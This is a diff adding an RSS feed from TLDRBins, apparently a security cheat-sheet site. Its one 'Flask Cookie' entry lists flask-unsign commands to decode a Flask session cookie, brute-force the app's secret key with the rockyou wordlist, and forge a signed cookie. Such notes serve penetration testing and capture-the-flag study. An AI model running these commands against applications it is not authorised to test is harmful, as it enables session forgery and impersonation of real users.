@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sign on TLDRBins</title>
+    <link>https://tldrbins.github.io/@sign/</link>
+    <description>Recent content in Sign on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@sign/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Flask Cookie</title>
+      <link>https://tldrbins.github.io/flask_cookie/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/flask_cookie/</guid>
+      <description> flask-unsign pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
+    </item>
+  </channel>
+</rss>
